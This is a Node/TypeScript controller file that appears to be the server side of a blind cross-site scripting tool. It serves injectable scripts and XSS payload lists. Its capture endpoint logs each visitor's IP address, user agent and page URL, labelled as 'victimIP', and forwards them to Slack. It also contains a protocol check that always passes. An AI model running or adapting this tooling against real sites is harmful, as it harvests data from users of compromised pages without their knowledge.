// @ts-nocheck
import uuid = require('uuid/v1');

import config from "config";

import template = require('../utilities/templates/script');
import payloads = require('../utilities/payloads');
import Domain = require('../utilities/domain');
import URL = require('url');

const reporters = [
  // require('server/utilities/services/email'),
  require('../utilities/services/slack'),
  // require('server/utilities/services/discord'),
  // require('server/utilities/services/spark'),
  // require('server/utilities/services/twitter'),
  // require('server/utilities/services/sms'),
  // require('server/utilities/services/github'),
  // require('server/utilities/save')
];

function reportToUtilities(domain, config) {
  reporters.forEach(svc => svc.send(domain,config));
}

exports.displayScript = (req, res) => {
  res.type('.js');
  res.send(template.generateTemplate(config));
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  res.send(payloads.generatePayloads(config));
};

exports.capture = (req, res) => {
  let domain = {};
  if (req.body._) {
    domain = Domain.fromPayload(req.body._);
  } else {
    domain = new Domain(config);
    domain.url = req.get('referer') || null;
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress ||
    null;
  domain.userAgent = req.headers['user-agent'] || null;

  Domain.identifier = uuid();
  
  if (domain.url !== null) {
    const validDomain = new URL.URL({ toString: () => domain.url });
    if (validDomain.protocol === 'https:' || 'http:' || 'file:') {
      reportToUtilities(domain, config);
    }
  }
  res.redirect(`${domain.url}#x1`);
};
